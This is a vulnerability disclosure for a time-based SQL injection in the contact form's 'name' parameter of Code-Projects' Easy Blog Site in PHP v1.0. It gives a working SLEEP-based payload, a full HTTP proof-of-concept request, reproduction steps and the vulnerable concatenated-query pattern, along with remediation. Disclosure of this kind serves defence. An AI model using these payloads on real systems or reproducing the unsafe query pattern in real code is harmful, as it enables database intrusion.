## SQL Injection in Easy Blog Site PHP name Parameter
## Credit

Discovered by: Ahmad Marzouk


## Product

Easy Blog Site in PHP

## Vendor

Code-Projects

## Vendor Homepage

https://code-projects.org/easy-blog-site-in-php-with-source-code/

## Affected Version

Easy Blog Site in PHP v1.0

## Vulnerability Type

SQL Injection

CWE

CWE-89 – Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## Severity

High

## Description

A SQL Injection vulnerability exists in the Easy Blog Site in PHP within the contact form functionality.

The vulnerability occurs in the following endpoint:

/blog/users/contact_us.php

The application processes user input submitted through an HTTP POST request. The name parameter is user-controlled and is incorporated into backend SQL queries without proper validation or sanitization.

Testing confirmed that the name parameter is vulnerable to time-based SQL injection, indicating that attacker-supplied SQL expressions are executed by the database engine.

By injecting a crafted payload into the name parameter, an attacker can manipulate the SQL query. In the provided request, a delay-based SQL payload using the SLEEP() function was used:

name='+(select*from(select(sleep(20)))a)+'

When the request is processed, the server response is delayed by approximately 20 seconds, confirming successful execution of the injected SQL statement.

This demonstrates that the application directly includes user input in SQL queries without using prepared statements or parameterized queries.

## Root Cause

The vulnerability is caused by unsafe construction of SQL queries using user-controlled input.

The application retrieves the name parameter from the HTTP request and concatenates it directly into an SQL query without input validation or parameter binding.

A typical vulnerable pattern is:

$name = $_POST['name'];
$query = "INSERT INTO contact (name,email,message) VALUES ('$name','$email','$message')";

Because the input is not sanitized, attackers can inject SQL syntax that alters the query logic.

The absence of prepared statements and proper input handling leads to SQL injection.

## Affected Endpoint
/blog/users/contact_us.php
## Vulnerable Parameter
name
## HTTP Method
POST
## Proof of Concept

The following HTTP request demonstrates exploitation of the vulnerability:
 ```plain
POST /blog/users/contact_us.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Sec-CH-UA: "Google Chrome";v="145", "Not=A?Brand";v="8", "Chromium";v="145"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "macOS"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=r6eokfuq9ojj1elmc1u5i3j30j
Origin: https://localhost
Upgrade-Insecure-Requests: 1
Referer: https://localhost/blog/users/contact_us.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

name='%2b(select*from(select(sleep(20)))a)%2b'&email=&message=&human=&submit=Send
 ```
## Steps to Reproduce

Install the Easy Blog Site in PHP application.

Navigate to the contact page.

Intercept the request using Burp Suite or a similar proxy tool.

Modify the name parameter to include the payload:

'+(select*from(select(sleep(20)))a)+'

Send the request to the server.

## Result

The server response is delayed by approximately 20 seconds, confirming that the injected SQL payload is executed.

## Impact

Successful exploitation of this vulnerability may allow attackers to:

Execute arbitrary SQL commands

Extract sensitive database information

Modify or delete database records

Perform database enumeration

Escalate privileges

Potentially compromise the entire application database

## Vulnerability Classification
CWE

CWE-89 – SQL Injection

OWASP Top 10

A03:2021 – Injection

## Suggested Remediation
Use Prepared Statements
$stmt = $conn->prepare("INSERT INTO contact (name,email,message) VALUES (?,?,?)");
$stmt->execute([$name,$email,$message]);
Input Validation

Validate and sanitize all user inputs before processing.

Least Privilege

Use restricted database accounts with minimal privileges.

Security Testing

Perform regular code audits and penetration testing.

## PoC

<img width="945" height="541" alt="Image" src="https://github.com/user-attachments/assets/fdf3f886-e845-4b36-ad09-0b61592676f4" />
